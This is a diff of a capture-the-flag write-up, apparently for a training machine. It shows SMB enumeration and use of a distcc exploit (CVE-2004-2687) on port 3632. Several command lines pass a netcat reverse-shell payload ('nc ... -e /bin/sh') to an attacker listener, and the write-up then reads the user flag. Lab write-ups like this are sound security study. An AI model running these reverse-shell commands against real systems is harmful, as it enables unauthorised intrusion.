@@ -21,7 +21,7 @@ and get back some users.
 ![image](https://user-images.githubusercontent.com/110210595/185814007-319d68bc-004b-4242-b3e0-a943b4eda8e9.png)
 
 we can see that tmp is READ, WRITE. Lets login and see what we can find.<br>
-I use ``` smbclient \\\\10.10.10.3\\tmp markdown ``` and we get a hit.<br>
+I use ``` smbclient \\\\10.10.10.3\\tmp ``` and we get a hit.<br>
 I use ``` ls ```  to see what we can find. Unfortunately there is nothing here either.<br>
 We could use put and get files here but there is no port 80 open for us to execute the files to gain a shell from here. Some bad luck but we got more info so lets keep looking.
 
@@ -33,12 +33,12 @@ after reading the exploit it seems to generate a random alpha numeric string. Re
 If it is able to connect to the host it will send the payload and hopefully give us a reverse shell.
 
 Let's give it a try. I started by copying the code and writing it to a file naming it CVE-2004-2687.py, did  ``` chmod +x CVE-2004-2687.py ```<br>
-the file is ready to be used. First I started a listener on my attacking machine with ``` markdown nc -lvnp 9001 ``` and then used the following command<br>
-``` markdown ./CVE-2004-2687.py -t 10.10.10.3 -p 3632 -c "nc 10.10.14.10 9001 -e /bin/sh" ``` No good, got errors.<br>
-Then I tried. ``` markdown python3 CVE-2004-2687.py -t 10.10.10.3 -p 3632 -c "nc 10.10.14.10 9001 -e /bin/sh" ``` I got a connected to remote service Ok but then the
+the file is ready to be used. First I started a listener on my attacking machine with ``` nc -lvnp 9001 ``` and then used the following command<br>
+``` ./CVE-2004-2687.py -t 10.10.10.3 -p 3632 -c "nc 10.10.14.10 9001 -e /bin/sh" ``` No good, got errors.<br>
+Then I tried. ``` python3 CVE-2004-2687.py -t 10.10.10.3 -p 3632 -c "nc 10.10.14.10 9001 -e /bin/sh" ``` I got a connected to remote service Ok but then the
 socket timed out instantly killing the connection. I went back to the exploit and read the comments, it mentioned that python3 is to new.
 So I was going to work my way down from python3 to python.<br>
-Next up,  ``` markdown python2 CVE-2004-2687.py -t 10.10.10.3 -p 3632 -c "nc 10.10.14.10 9001 -e /bin/sh" ``` Success, we get a shell!
+Next up,  ``` python2 CVE-2004-2687.py -t 10.10.10.3 -p 3632 -c "nc 10.10.14.10 9001 -e /bin/sh" ``` Success, we get a shell!
 
 ![image](https://user-images.githubusercontent.com/110210595/185814122-93aa8ce3-0128-4f21-a19b-8d04b5580a30.png)
 
@@ -51,8 +51,8 @@ Let's upgrade the shell. I used the following.<br>
 ``` enter ```<br>
 ``` enter ```<br>
 
-We're a normal user daemon. I started off with ``` markdown sudo -l ``` but it asked for a password. Let's move on.
-I look around a bit and ``` markdown cd /home ``` directory and do a ``` markdown ls ``` and see what's there. Nothing good in the user directory but I did go into makis and find the <em><strong>user.txt</em></strong> file. I do a cat user.txt at it and we get out our first flag.  
+We're a normal user daemon. I started off with ``` sudo -l ``` but it asked for a password. Let's move on.
+I look around a bit and ``` cd /home ``` directory and do a ``` ls ``` and see what's there. Nothing good in the user directory but I did go into makis and find the <em><strong>user.txt</em></strong> file. I do a cat user.txt at it and we get out our first flag.  
 
 ![image](https://user-images.githubusercontent.com/110210595/185814188-b2d3ad0a-a11d-4f7e-a4bc-49c2566b5fa1.png)
 
